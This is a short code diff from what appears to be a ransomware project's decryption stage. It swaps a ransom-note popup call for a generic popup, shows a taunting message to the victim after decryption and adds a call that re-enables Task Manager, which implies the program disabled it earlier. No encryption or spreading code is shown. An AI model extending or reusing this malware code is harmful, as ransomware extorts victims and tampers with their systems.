@@ -34,7 +34,9 @@ if __name__ == '__main__':
                 purple_pop_up(text="Wrong key")
                 
         except Exception as e:
-            RansomNote.wrong_key_popup()
+            purple_pop_up(text="Wrong key")
     
     print('All data was successfully decrypted')
     purple_pop_up(text="All data was decrypted successfully. Be careful on the internet next time ;)")
+
+    cm.enable_task_manager()
